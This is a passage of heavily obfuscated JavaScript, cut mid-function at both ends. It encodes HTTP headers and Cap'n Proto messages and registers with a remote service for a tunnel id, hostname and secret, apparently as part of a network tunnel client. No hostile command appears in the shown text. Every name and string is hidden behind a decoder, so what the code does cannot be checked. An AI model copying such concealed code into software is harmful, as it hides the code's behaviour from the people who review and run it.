                    const [q, r] = this[cB(0x11e)]['pop']();
                    this[cB(0x566)] -= b[cB(0x4e3)](b[cB(0x34f)](0x20, Buffer[cB(0x2a2)](q, 'utf8')), Buffer[cB(0x2a2)](r, b[cB(0x39c)]));
                }
                continue;
            }
            let g, h;
            [g, d] = b[cB(0x15c)](a0aa, a, d, 0x4);
            if (g)
                h = this[cB(0x6f2)](g)[0x0];
            else {
                let s;
                [s, d] = b['FMdsV'](a0ab, a, d), h = s[cB(0x6b0)](b[cB(0x39c)])[cB(0x44e)]();
            }
            let i;
            [i, d] = b[cB(0x701)](a0ab, a, d), c[cB(0x385)]([
                h,
                i[cB(0x6b0)](cB(0x5e6))
            ]);
        }
        return c;
    }
}
function a0ad(a, b, c) {
    const cC = a0aQ, d = {
            'qiSxH': function (h, i) {
                return h << i;
            },
            'ijFwC': function (h, i) {
                return h < i;
            },
            'vzZVn': function (h, i) {
                return h | i;
            },
            'jYPmI': function (h, i) {
                return h | i;
            },
            'ULNre': function (h, i) {
                return h >= i;
            },
            'ctMKz': function (h, i) {
                return h & i;
            },
            'ocCKk': function (h, i) {
                return h / i;
            }
        }, f = d['qiSxH'](0x1, b) - 0x1;
    if (d['ijFwC'](a, f))
        return Buffer[cC(0x6ef)]([d[cC(0x533)](c, a)]);
    const g = [d[cC(0x159)](c, f)];
    a -= f;
    while (d[cC(0x62e)](a, 0x80)) {
        g[cC(0x385)](d[cC(0x4cc)](a, 0x7f) | 0x80), a = Math[cC(0x527)](d['ocCKk'](a, 0x80));
    }
    return g['push'](a), Buffer[cC(0x6ef)](g);
}
function a0ae(a) {
    const cD = a0aQ, b = { 'mwqTR': 'utf8' }, c = Buffer[cD(0x6ef)](a, b['mwqTR']);
    return Buffer[cD(0x562)]([
        a0ad(c[cD(0x54b)], 0x7, 0x0),
        c
    ]);
}
function a0af(a) {
    const cE = a0aQ, b = {
            'phQpo': function (d, f) {
                return d === f;
            },
            'llXQL': cE(0x415),
            'Zjcka': '200',
            'oiDiT': cE(0x1b3),
            'tdjqB': function (d, f) {
                return d === f;
            },
            'xmRoV': function (d, f) {
                return d === f;
            },
            'Lqczw': function (d, f) {
                return d === f;
            },
            'ELeon': function (d, f) {
                return d === f;
            },
            'LvWmI': cE(0x355),
            'LBbvP': function (d, f) {
                return d === f;
            },
            'CSrpI': function (d, f) {
                return d === f;
            },
            'zqWTZ': cE(0x4bb),
            'VmRpb': function (d, f) {
                return d === f;
            },
            'KvQnV': cE(0x481),
            'iuehs': function (d, f, g, h) {
                return d(f, g, h);
            },
            'ceUHg': function (d, f) {
                return d(f);
            },
            'MuGzr': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b['phQpo'](d, b[cE(0x128)]) && f === b[cE(0x732)])
            c[cE(0x385)](0x88);
        else {
            if (d === b[cE(0x128)] && f === b[cE(0x244)])
                c[cE(0x385)](0x89);
            else {
                if (b['tdjqB'](d, b[cE(0x128)]) && b[cE(0x574)](f, '206'))
                    c[cE(0x385)](0x8a);
                else {
                    if (b['Lqczw'](d, b[cE(0x128)]) && b[cE(0x4af)](f, b['LvWmI']))
                        c['push'](0x8b);
                    else {
                        if (b[cE(0x301)](d, b[cE(0x128)]) && f === cE(0x297))
                            c[cE(0x385)](0x8c);
                        else {
                            if (b[cE(0x6c9)](d, cE(0x415)) && f === b['zqWTZ'])
                                c[cE(0x385)](0x8d);
                            else
                                d === ':status' && b[cE(0x299)](f, b[cE(0x19d)]) ? c['push'](0x8e) : (c[cE(0x385)](...b[cE(0x3e9)](a0ad, 0x0, 0x4, 0x0)), c['push'](...b[cE(0x314)](a0ae, d)), c[cE(0x385)](...b[cE(0x18b)](a0ae, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[cE(0x6ef)](c);
}
class a0ag {
    constructor() {
        const cF = a0aQ;
        this[cF(0x28e)] = [];
    }
    [a0aQ(0x381)](a) {
        const cG = a0aQ, b = {
                'pzKqb': function (d, f) {
                    return d < f;
                }
            }, c = this[cG(0x28e)][cG(0x54b)];
        for (let d = 0x0; b['pzKqb'](d, a); d++) {
            this[cG(0x28e)]['push'](0x0n);
        }
        return c;
    }
    [a0aQ(0x709)](a, b, c, d) {
        const cH = a0aQ, f = {
                'tBYDC': function (j, k) {
                    return j - k;
                },
                'MHMEK': function (j, k) {
                    return j - k;
                },
                'WUZBo': function (j, k) {
                    return j(k);
                },
                'ltJcr': function (j, k) {
                    return j | k;
                },
                'disKY': function (j, k) {
                    return j & k;
                },
                'JJVOr': function (j, k) {
                    return j << k;
                },
                'UYpmE': function (j, k) {
                    return j(k);
                }
            }, g = f[cH(0x67b)](f[cH(0x636)](b, a), 0x1), h = f[cH(0x425)](BigInt, g) << 0x2n & 0xfffffffcn, i = f[cH(0x52c)](BigInt(f[cH(0x25a)](c, 0xffff)), f[cH(0x26e)](f['UYpmE'](BigInt, f['disKY'](d, 0xffff)), 0x10n));
        this['words'][a] = f[cH(0x52c)](h, f[cH(0x26e)](i, 0x20n));
    }
    [a0aQ(0x2aa)](a, b, c) {
        const cI = a0aQ, d = {
                'oDdiC': function (g, h) {
                    return g << h;
                },
                'uJIrG': function (g, h) {
                    return g(h);
                },
                'debKc': function (g, h) {
                    return g * h;
                },
                'EEEGp': function (g, h) {
                    return g & h;
                }
            }, f = d[cI(0x59a)](0xffn, d[cI(0x596)](BigInt, d[cI(0x450)](b, 0x8)));
        this[cI(0x28e)][a] = d[cI(0x568)](this['words'][a], ~f) | d[cI(0x59a)](d['uJIrG'](BigInt, d[cI(0x568)](c, 0xff)), d[cI(0x596)](BigInt, d[cI(0x450)](b, 0x8)));
    }
    [a0aQ(0x207)](a, b, c) {
        const cJ = a0aQ, d = {
                'AuDkK': function (g, h) {
                    return g << h;
                },
                'SbrBA': function (g, h) {
                    return g(h);
                },
                'MtLws': function (g, h) {
                    return g & h;
                },
                'YaMFF': function (g, h) {
                    return g(h);
                },
                'sTdUi': function (g, h) {
                    return g * h;
                }
            }, f = d[cJ(0x445)](0xffffn, d[cJ(0x559)](BigInt, b * 0x8));
        this['words'][a] = d[cJ(0x330)](this[cJ(0x28e)][a], ~f) | d[cJ(0x445)](BigInt(d[cJ(0x330)](c, 0xffff)), d[cJ(0x319)](BigInt, d[cJ(0x233)](b, 0x8)));
    }
    ['setU32'](a, b, c) {
        const cK = a0aQ, d = {
                'ezOkB': function (g, h) {
                    return g << h;
                },
                'wSjPI': function (g, h) {
                    return g(h);
                },
                'MrUMV': function (g, h) {
                    return g * h;
                },
                'llfpi': function (g, h) {
                    return g | h;
                },
                'TMhOI': function (g, h) {
                    return g << h;
                },
                'IeGfH': function (g, h) {
                    return g & h;
                }
            }, f = d[cK(0x298)](0xffffffffn, d[cK(0x1f5)](BigInt, d[cK(0x537)](b, 0x8)));
        this[cK(0x28e)][a] = d[cK(0x730)](this[cK(0x28e)][a] & ~f, d[cK(0x561)](d[cK(0x1f5)](BigInt, d[cK(0x2e3)](c, 0xffffffff)), BigInt(b * 0x8)));
    }
    [a0aQ(0x219)](a, b) {
        const cL = a0aQ, c = {
                'HLxNm': function (d, f) {
                    return d & f;
                },
                'QhpaY': function (d, f) {
                    return d(f);
                }
            };
        this[cL(0x28e)][a] = c['HLxNm'](c[cL(0x2e4)](BigInt, b), 0xffffffffffffffffn);
    }
    ['writeBytes'](a, b, c = ![]) {
        const cM = a0aQ, d = {
                'pmnrq': function (m, n) {
                    return m === n;
                },
                'HPKyS': function (m, n) {
                    return m + n;
                },
                'xudOQ': function (m, n) {
                    return m < n;
                },
                'kevAz': function (m, n) {
                    return m / n;
                },
                'sYXQM': function (m, n) {
                    return m % n;
                },
                'jqgBQ': function (m, n) {
                    return m - n;
                },
                'ldSCn': function (m, n) {
                    return m | n;
                },
                'TXCTt': function (m, n) {
                    return m << n;
                },
                'Pakst': function (m, n) {
                    return m(n);
                },
                'jWNsB': function (m, n) {
                    return m << n;
                },
                'DwPFR': function (m, n) {
                    return m & n;
                },
                'eMrcw': function (m, n) {
                    return m << n;
                }
            }, f = d[cM(0x610)](typeof b, 'string') ? Buffer[cM(0x6ef)](b, cM(0x5e6)) : b, g = d[cM(0x61b)](f['length'], c ? 0x1 : 0x0), h = this[cM(0x381)](Math[cM(0x608)](g / 0x8));
        for (let m = 0x0; d[cM(0x686)](m, f[cM(0x54b)]); m++) {
            this[cM(0x2aa)](h + Math[cM(0x527)](d[cM(0x704)](m, 0x8)), d[cM(0x525)](m, 0x8), f[m]);
        }
        const j = d['jqgBQ'](d[cM(0x575)](h, a), 0x1), k = d[cM(0x77c)](d[cM(0x6c3)](d[cM(0x4f3)](BigInt, j), 0x2n), 0x1n) & 0xffffffffn, l = d[cM(0x77c)](0x2n, d[cM(0x1b9)](d[cM(0x4f3)](BigInt, d[cM(0x1b8)](g, 0x1fffffff)), 0x3n));
        this[cM(0x28e)][a] = d[cM(0x77c)](k, d['eMrcw'](l, 0x20n));
    }
    [a0aQ(0x200)](a, b) {
        const cN = a0aQ, c = {
                'XfCHd': function (g, h) {
                    return g - h;
                },
                'biBpl': function (g, h) {
                    return g & h;
                },
                'yUPqo': function (g, h) {
                    return g << h;
                },
                'OKBmV': function (g, h) {
                    return g | h;
                },
                'YFSTa': function (g, h) {
                    return g << h;
                },
                'FyqPI': function (g, h) {
                    return g(h);
                },
                'BwyGT': function (g, h) {
                    return g + h;
                }
            };
        if (!b[cN(0x54b)]) {
            this[cN(0x28e)][a] = 0x0n;
            return;
        }
        const d = this[cN(0x381)](b['length']), f = c[cN(0x5eb)](d, a) - 0x1;
        this[cN(0x28e)][a] = c[cN(0x47c)](c[cN(0x1ce)](BigInt(f), 0x2n) | 0x1n, 0xffffffffn) | c[cN(0x1ce)](c['OKBmV'](0x6n, c[cN(0x20a)](c['FyqPI'](BigInt, b[cN(0x54b)]), 0x3n)), 0x20n);
        for (let g = 0x0; g < b['length']; g++) {
            this['writeBytes'](c[cN(0x4ea)](d, g), b[g], !![]);
        }
    }
    [a0aQ(0x2e9)]() {
        const cO = a0aQ, a = {
                'ZWekt': function (d, f) {
                    return d * f;
                },
                'JiNGL': function (d, f) {
                    return d < f;
                },
                'sWjpx': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[cO(0x381)](0x8);
        b[cO(0x768)](0x0, 0x0), b[cO(0x768)](this[cO(0x28e)]['length'], 0x4);
        const c = Buffer[cO(0x381)](a[cO(0x4d3)](this[cO(0x28e)][cO(0x54b)], 0x8));
        for (let d = 0x0; a[cO(0x47b)](d, this[cO(0x28e)]['length']); d++) {
            c[cO(0x446)](a[cO(0x3c3)](this[cO(0x28e)][d], 0xffffffffffffffffn), d * 0x8);
        }
        return Buffer[cO(0x562)]([
            b,
            c
        ]);
    }
}
function a0ah(a) {
    const cP = a0aQ, b = new a0ag(), c = b[cP(0x381)](0x1), d = b[cP(0x381)](0x1), f = b[cP(0x381)](0x1);
    b[cP(0x709)](c, d, 0x1, 0x1), b[cP(0x207)](d, 0x0, 0x8);
    const g = b[cP(0x381)](0x1);
    return b[cP(0x381)](0x1), b[cP(0x709)](f, g, 0x1, 0x1), b[cP(0x37b)](g, 0x0, a), b[cP(0x2e9)]();
}
function a0ai(a, b, c, d, f, g) {
    const cQ = a0aQ, h = {
            'BtXsQ': function (H, I) {
                return H | I;
            },
            'cjQsl': function (H, I) {
                return H & I;
            },
            'MxrzP': cQ(0x37a),
            'mKWAk': cQ(0x5ac),
            'pnEJa': 'Nexus-Python'
        }, i = new a0ag(), j = i[cQ(0x381)](0x1), k = i[cQ(0x381)](0x1), l = i[cQ(0x381)](0x1);
    i['structPtr'](j, k, 0x1, 0x1), i[cQ(0x207)](k, 0x0, 0x2);
    const m = i[cQ(0x381)](0x1), n = i[cQ(0x381)](0x1);
    i[cQ(0x381)](0x1);
    const o = i[cQ(0x381)](0x1), p = i[cQ(0x381)](0x1);
    i[cQ(0x381)](0x1), i[cQ(0x709)](l, m, 0x3, 0x3), i[cQ(0x37b)](m, 0x0, a), i[cQ(0x219)](n, 0xf71695ec7fe85497n);
    const q = i[cQ(0x381)](0x1), r = i[cQ(0x381)](0x1);
    i['structPtr'](o, q, 0x1, 0x1), i[cQ(0x207)](q, 0x4, 0x1);
    const s = i[cQ(0x381)](0x1);
    i['alloc'](0x1), i['structPtr'](r, s, 0x1, 0x1), i[cQ(0x37b)](s, 0x0, b);
    const t = i[cQ(0x381)](0x1);
    i['alloc'](0x1), i['structPtr'](p, t, 0x0, 0x2);
    const u = i[cQ(0x381)](0x1), v = i['alloc'](0x1), w = i[cQ(0x381)](0x1), x = i[cQ(0x381)](0x1);
    i[cQ(0x709)](t, u, 0x1, 0x3), i[cQ(0x2aa)](u, 0x0, g);
    const y = i[cQ(0x381)](0x1), z = i[cQ(0x381)](0x1);
    i[cQ(0x709)](v, y, 0x0, 0x2), i[cQ(0x2cc)](y, c, !![]), i[cQ(0x2cc)](z, d), i[cQ(0x2cc)](w, f);
    const A = i[cQ(0x381)](0x1), B = i[cQ(0x381)](0x1);
    i[cQ(0x381)](0x1), i[cQ(0x709)](x, A, 0x1, 0x2);
    const C = i[cQ(0x381)](0x1), D = i[cQ(0x381)](0x1), E = i[cQ(0x381)](0x1), F = i['alloc'](0x1);
    i['structPtr'](B, C, 0x0, 0x4);
    const G = a0k[cQ(0x29c)](0x10);
    return G[0x6] = h[cQ(0x403)](h['cjQsl'](G[0x6], 0xf), 0x40), G[0x8] = h[cQ(0x403)](G[0x8] & 0x3f, 0x80), i[cQ(0x2cc)](C, G), i[cQ(0x200)](D, [
        h[cQ(0x1b0)],
        cQ(0x3ee)
    ]), i[cQ(0x2cc)](E, h[cQ(0x401)], !![]), i[cQ(0x2cc)](F, h[cQ(0x3b2)], !![]), i[cQ(0x2e9)]();
}
function a0b(a, b) {
    a = a - 0x10c;
    const c = a0a();
    let d = c[a];
    if (a0b['OfYBdU'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['UrvqKY'] = e, a0b['sxZygQ'] = {}, a0b['OfYBdU'] = !![];
    }
    const f = c[0x0];
    a0b['lStOfj'] !== f && (a0b['sxZygQ'] = {}, a0b['lStOfj'] = f);
    const g = a0b['sxZygQ'][a];
    return g === undefined ? (d = a0b['UrvqKY'](d), a0b['sxZygQ'][a] = d) : d = g, d;
}
function a0aj(a) {
    const cR = a0aQ, b = {
            'tUsUG': function (f, g) {
                return f >= g;
            },
            'QgmyC': function (f, g) {
                return f - g;
            },
            'iFkhS': function (f, g) {
                return f + g;
            },
            'qjhIU': function (f, g) {
                return f + g;
            },
            'zOMRv': function (f, g) {
                return f + g;
            },
            'ambOZ': function (f, g) {
                return f * g;
            },
            'FDHiS': function (f, g) {
                return f % g;
            },
            'QupED': function (f, g) {
                return f < g;
            },
            'ywxSs': function (f, g) {
                return f - g;
            },
            'BqjEs': function (f, g) {
                return f * g;
            },
            'ZNCwx': function (f, g) {
                return f - g;
            },
            'ETtSy': function (f, g) {
                return f !== g;
            },
            'pENna': cR(0x532),
            'qpzwm': function (f, g) {
                return f + g;
            },
            'NGKOx': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b['tUsUG'](b[cR(0x284)](a['length'], d), 0x8)) {
        const f = a[cR(0x430)](d), g = a[cR(0x430)](b[cR(0x251)](d, 0x4)), h = b['qjhIU'](f, 0x1);
        let j = b[cR(0x72f)](0x2, h), k = b[cR(0x5f0)](j, 0x4);
        b[cR(0x419)](k, 0x8) && (k += 0x4);
        if (b[cR(0x6af)](b['ywxSs'](a[cR(0x54b)], d), k))
            break;
        const l = [g];
        for (let n = 0x1; n < h; n++) {
            l[cR(0x385)](a['readUInt32LE'](b['qjhIU'](d, 0x4) + b[cR(0x6e0)](n, 0x4)));
        }
        const m = b['iFkhS'](k, l[cR(0x48f)]((o, p) => o + p, 0x0) * 0x8);
        if (b[cR(0x264)](a['length'], d) < m)
            break;
        if (b['ETtSy'](h, 0x1))
            throw new Error(b[cR(0x213)]);
        c['push'](a[cR(0x74f)](b[cR(0x5b2)](d, k), b['NGKOx'](d, m))), d += m;
    }
    return [
        c,
        a[cR(0x74f)](d)
    ];
}
function a0ak(a, b) {
    const cS = a0aQ, c = {
            'QugdW': function (j, k) {
                return j >= k;
            },
            'vjIAJ': 'Cap\x27n\x20Proto\x20pointer\x20out\x20of\x20bounds',
            'nNcFC': function (j, k) {
                return j & k;
            },
            'RwjhE': function (j, k) {
                return j >> k;
            },
            'Pyjwo': function (j, k) {
                return j + k;
            },
            'Bdfxz': function (j, k) {
                return j(k);
            },
            'faxIC': function (j, k) {
                return j & k;
            },
            'OCMQN': function (j, k) {
                return j >> k;
            },
            'apYRk': function (j, k) {
                return j >> k;
            },
            'XRYpo': function (j, k) {
                return j < k;
            },
            'vEEfV': function (j, k) {
                return j > k;
            },
            'ETLLR': function (j, k) {
                return j + k;
            },
            'dPNTM': function (j, k) {
                return j + k;
            }
        };
    if (c[cS(0x3f7)](b, a[cS(0x54b)]))
        throw new Error(c[cS(0x5c1)]);
    const d = a[b];
    if (c['nNcFC'](d, 0x3n) !== 0x0n)
        throw new Error(cS(0x309));
    let f = c[cS(0x41f)](d, 0x2n) & 0x3fffffffn;
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c['Pyjwo'](b, 0x1) + Number(f), h = c[cS(0x6de)](Number, c[cS(0x1f9)](c['OCMQN'](d, 0x20n), 0xffffn)), i = c[cS(0x6de)](Number, c[cS(0x1f9)](c['apYRk'](d, 0x30n), 0xffffn));
    if (c[cS(0x23c)](g, 0x0) || c[cS(0x1ec)](c[cS(0x5a2)](c['dPNTM'](g, h), i), a['length']))
        throw new Error(c[cS(0x5c1)]);
    return [
        g,
        h,
        i
    ];
}
function a0al(a, b) {
    const cT = a0aQ, c = {
            'npHBl': function (m, n) {
                return m >= n;
            },
            'RvtRR': function (m, n) {
                return m !== n;
            },
            'UWCKT': function (m, n) {
                return m & n;
            },
            'wZcAa': function (m, n) {
                return m >> n;
            },
            'xcqJV': function (m, n) {
                return m + n;
            },
            'rygMw': function (m, n) {
                return m(n);
            },
            'vYmjr': function (m, n) {
                return m >> n;
            },
            'YWANk': function (m, n) {
                return m / n;
            },
            'xDNxv': function (m, n) {
                return m < n;
            },
            'uCwyb': function (m, n) {
                return m > n;
            },
            'tVUil': function (m, n) {
                return m + n;
            },
            'IuiCb': function (m, n) {
                return m * n;
            },
            'gQWGe': function (m, n) {
                return m < n;
            },
            'wTKAF': function (m, n) {
                return m * n;
            },
            'RwZTL': cT(0x5e6)
        };
    if (c['npHBl'](b, a[cT(0x54b)]))
        return '';
    const d = a[b];
    if (c[cT(0x1f1)](c['UWCKT'](d, 0x3n), 0x1n))
        return '';
    let f = c[cT(0x3d1)](d, 0x2n) & 0x3fffffffn;
    c[cT(0x703)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[cT(0x155)](b, 0x1) + Number(f), h = c[cT(0x3cc)](Number, c[cT(0x703)](d >> 0x20n, 0x7n)), j = Number(c[cT(0x179)](d, 0x23n)), k = Math[cT(0x608)](c[cT(0x182)](j, 0x8));
    if (c['RvtRR'](h, 0x2) || c['xDNxv'](g, 0x0) || c['uCwyb'](c[cT(0x288)](g, k), a[cT(0x54b)]))
        return '';
    const l = Buffer['alloc'](c[cT(0x2db)](k, 0x8));
    for (let m = 0x0; c['gQWGe'](m, k); m++) {
        l['writeBigUInt64LE'](c['UWCKT'](a[c['xcqJV'](g, m)], 0xffffffffffffffffn), c['wTKAF'](m, 0x8));
    }
    return l[cT(0x74f)](0x0, j)[cT(0x6b0)](c[cT(0x1ee)])[cT(0x5f7)](/\0+$/, '');
}
function a0am(a) {
    const cU = a0aQ, b = {
            'xFfHE': function (z, A) {
                return z % A;
            },
            'nyRuJ': function (z, A) {
                return z < A;
            },
            'nOpLL': function (z, A) {
                return z / A;
            },
            'bWTcR': function (z, A) {
                return z !== A;
            },
            'dmdHp': function (z, A) {
                return z & A;
            },
            'ukkMS': function (y, z, A) {
                return y(z, A);
            },
            'wImKp': function (z, A) {
                return z + A;
            },
            'RyKxu': function (y, z) {
                return y(z);
            },
            'rHPte': function (z, A) {
                return z >> A;
            },
            'klkai': function (z, A) {
                return z === A;
            },
            'vuNyO': function (z, A) {
                return z !== A;
            },
            'ZbIzJ': cU(0x362),
            'wGweN': function (y, z, A) {
                return y(z, A);
            },
            'UvLfE': function (y, z, A) {
                return y(z, A);
            },
            'QuLDM': function (y, z) {
                return y(z);
            },
            'GlgYn': cU(0x12a),
            'YRwuI': function (y, z, A) {
                return y(z, A);
            },
            'YvVYh': function (z, A) {
                return z + A;
            },
            'SXGaw': function (y, z, A) {
                return y(z, A);
            },
            'FdYPp': function (z, A) {
                return z & A;
            }
        };
    if (b['xFfHE'](a[cU(0x54b)], 0x8) || b['nyRuJ'](a[cU(0x54b)], 0x18))
        throw new Error(cU(0x5e7));
    const c = [];
    for (let y = 0x0; y < b[cU(0x6a2)](a[cU(0x54b)], 0x8); y++) {
        c['push'](a['readBigUInt64LE'](y * 0x8));
    }
    let d, f, g;
    [d, f, g] = a0ak(c, 0x0);
    if (f < 0x1 || b[cU(0x680)](b[cU(0x13b)](c[d], 0xffffn), 0x3n))
        throw new Error(cU(0x1cf));
    let h, j, k;
    [h, j, k] = b[cU(0x1fb)](a0ak, c, b[cU(0x263)](d, f));
    const l = b[cU(0x5b3)](Number, b[cU(0x13b)](b[cU(0x169)](c[h], 0x30n), 0xffffn));
    if (b[cU(0x658)](l, 0x1))
        return {
            'ok': ![],
            'error': b[cU(0x1fb)](a0al, c, h + j)
        };
    if (b[cU(0x313)](l, 0x0))
        return {
            'ok': ![],
            'error': b[cU(0x263)](b[cU(0x141)], l)
        };
    let m, n, o;
    [m, n, o] = b[cU(0x55f)](a0ak, c, b[cU(0x263)](h, j));
    let p, q, r;
    [p, q, r] = b[cU(0x649)](a0ak, c, b['wImKp'](m, n));
    const s = c[p], t = b[cU(0x144)](Number, s & 0xffffn);
    if (b[cU(0x658)](t, 0x0))
        return {
            'ok': ![],
            'error': b[cU(0x1fb)](a0al, c, b[cU(0x263)](p, q))
        };
    if (t !== 0x1)
        return {
            'ok': ![],
            'error': b[cU(0x263)](b[cU(0x6e8)], t)
        };
    let u, v, w;
    [u, v, w] = b[cU(0x4fe)](a0ak, c, b[cU(0x760)](p, q));
    const x = b[cU(0x1ac)](a0al, c, b['wImKp'](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b[cU(0x144)](Boolean, b[cU(0x142)](c[u], 0x1n))
    };
}
const a0an = {
    '.js': a0aQ(0x3b1),
    '.mjs': a0aQ(0x3b1),
    '.css': a0aQ(0x68b),
    '.json': a0aQ(0x41e),
    '.map': a0aQ(0x41e),
    '.wasm': 'application/wasm',
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': a0aQ(0x5a5),
    '.svg': 'image/svg+xml',
    '.xml': a0aQ(0x60e),
    '.woff': 'font/woff2',
    '.woff2': a0aQ(0x2ab),
    '.png': 'image/png',
    '.jpg': a0aQ(0x2b3),
    '.jpeg': a0aQ(0x2b3),
    '.gif': 'image/gif',
    '.ico': 'image/x-icon'
};
function a0ao(a) {
    const cV = a0aQ, b = {
            'GMYMS': function (f, g) {
                return f < g;
            }
        }, c = a[cV(0x750)]('/') ? a[cV(0x23b)](0x0, -0x1) : a, d = c[cV(0x57e)]('.');
    if (b[cV(0x535)](d, 0x0))
        return '';
    return a0an[c['slice'](d)[cV(0x44e)]()] || '';
}
function a0ap(a) {
    const cW = a0aQ, b = {
            'Wjinb': function (c, d) {
                return c !== d;
            },
            'TrNab': cW(0x5f4),
            'JZfAS': cW(0x10d),
            'JyhEH': function (c, d) {
                return c + d;
            },
            'jgEUh': 'base64'
        };
    if (Array['isArray'](a))
        return Buffer[cW(0x6ef)](a);
    if (b[cW(0x2de)](typeof a, b[cW(0x609)]))
        throw new Error(b['JZfAS']);
    return Buffer[cW(0x6ef)](b[cW(0x45b)](a, '='[cW(0x5f5)](-a[cW(0x54b)] % 0x4)), b[cW(0x51c)]);
}
const a0aq = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0ar(a) {
    const cX = a0aQ, b = {
            'wTPDl': function (c, d) {
                return c(d);
            },
            'NqOXj': function (c, d) {
                return c + d;
            },
            'HsbNl': function (c, d) {
                return c + d;
            },
            'SPwpa': cX(0x5e4),
            'TFHha': cX(0x2cb),
            'iEjIH': function (c, d) {
                return c(d);
            },
            'fcAdx': cX(0x6d2),
            'RPIcN': function (c, d) {
                return c(d);
            },
            'HWTFz': cX(0x437),
            'ibngW': cX(0x232),
            'KEjVK': cX(0x51a),
            'GacDV': cX(0x3a4),
            'kWAiU': 'error',
            'Dxxdg': function (c, d) {
                return c + d;
            },
            'LHriH': cX(0x748),
            'FYOtS': function (c, d) {
                return c(d);
            },
            'UVdKP': function (c, d) {
                return c === d;
            },
            'xWGEM': cX(0x6b1)
        };
    return new Promise((c, d) => {
        const cY = cX;
        let f;
        try {
            f = new URL(b[cY(0x380)](a[cY(0x5f7)](/\/+$/, ''), b[cY(0x71e)]));
        } catch (i) {
            b[cY(0x39e)](d, new Error(b[cY(0x380)](cY(0x4a5), i[cY(0x257)])));
            return;
        }
        const g = b[cY(0x5ca)](f['protocol'], cY(0x64d)) ? a0h : a0g, h = g['request'](f, {
                'method': cY(0x273),
                'headers': {
                    'Content-Type': b[cY(0x58f)],
                    'User-Agent': cY(0x6fb)
                },
                'timeout': 0x3a98
            }, j => {
                const cZ = cY, k = {
                        'OCUGe': cZ(0x5e6),
                        'Ohhdo': function (m, n) {
                            const d0 = cZ;
                            return b[d0(0x12f)](m, n);
                        },
                        'Znxqy': function (m, n) {
                            const d1 = cZ;
                            return b[d1(0x587)](m, n);
                        },
                        'fvfZX': function (m, n) {
                            return b['HsbNl'](m, n);
                        },
                        'bamek': b[cZ(0x259)],
                        'lPJAp': b[cZ(0x114)],
                        'NZvCu': function (m, n) {
                            return b['iEjIH'](m, n);
                        },
                        'jKCWl': b[cZ(0x512)],
                        'beAUV': function (m, n) {
                            const d2 = cZ;
                            return b[d2(0x378)](m, n);
                        },
                        'kViGP': b[cZ(0x25e)],
                        'bdeuI': 'string',
                        'zqrDp': function (m, n) {
                            return m !== n;
                        },
                        'LwCZi': b[cZ(0x2f9)],
                        'TlWHt': function (m, n) {
                            const d3 = cZ;
                            return b[d3(0x12f)](m, n);
                        },
                        'zwCNC': 'hex',
                        'WNFJl': b[cZ(0x126)]
                    }, l = [];
                j['on'](b[cZ(0x6d8)], m => l[cZ(0x385)](m)), j['on'](b[cZ(0x69e)], d), j['on'](cZ(0x2b5), () => {
                    const d4 = cZ, m = Buffer[d4(0x562)](l), n = j[d4(0x713)];
                    let o;
                    try {
                        o = JSON[d4(0x65d)](m[d4(0x6b0)](k['OCUGe']));
                    } catch (q) {
                        k['Ohhdo'](d, new Error(k[d4(0x412)](k['Znxqy'](k[d4(0x1ea)](k[d4(0x776)], n), k[d4(0x490)]), m['subarray'](0x0, 0x12c)['toString'](k['OCUGe']))));
                        return;
                    }
                    const p = o[d4(0x164)] || {};
                    if (!(o['success'] ?? !![]) || !p) {
                        k[d4(0x3c0)](d, new Error(k[d4(0x29e)] + JSON[d4(0x542)](o[d4(0x541)])));
                        return;
                    }
                    try {
                        const r = k[d4(0x2ca)](String, p['id']);
                        if (!a0aq[d4(0x590)](r))
                            throw new Error(k[d4(0x752)]);
                        if (typeof p[d4(0x358)] !== k[d4(0x4b4)] || k[d4(0x551)](typeof p['hostname'], k[d4(0x4b4)]))
                            throw new Error(k['LwCZi']);
                        const s = k['TlWHt'](a0ap, p[d4(0x16a)]), t = Buffer['from'](r[d4(0x5f7)](/-/g, ''), k[d4(0x30b)]);
                        k[d4(0x2ca)](c, [
                            p[d4(0x3fe)],
                            p[d4(0x358)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        d(new Error(k[d4(0x1ea)](k['WNFJl'], u[d4(0x257)])));
                    }
                });
            });
        h['on'](b[cY(0x69e)], j => d(new Error(cY(0x4a5) + j[cY(0x257)]))), h[cY(0x2b5)]();
    });
}
function a0as(a) {
    const d5 = a0aQ;
    return a[d5(0x18d)](([b, c]) => Buffer['from'](b, d5(0x5e6))[d5(0x6b0)](d5(0x1fc))[d5(0x5f7)](/=+$/, '') + ':' + Buffer['from'](c, d5(0x5e6))[d5(0x6b0)](d5(0x1fc))['replace'](/=+$/, ''))[d5(0x6e2)](';');
}
class a0at {
    constructor(a) {
        const d6 = a0aQ, b = {
                'GQCZB': d6(0x3a4),
                'mFILn': d6(0x3bf),
                'UWhQq': d6(0x2b5),
                'oNUgt': d6(0x52d)
            };
        this[d6(0x4cd)] = a, this['buffer'] = Buffer[d6(0x381)](0x0), this['waiters'] = [], this[d6(0x65f)] = null, this[d6(0x206)] = ![], a['on'](b[d6(0x4f7)], c => {
            const d7 = d6;
            this['buffer'] = this[d7(0x4ee)][d7(0x54b)] ? Buffer[d7(0x562)]([
                this['buffer'],
                c
            ]) : c, this['_drain']();
        }), a['on'](b[d6(0x6ae)], c => {
            const d8 = d6;
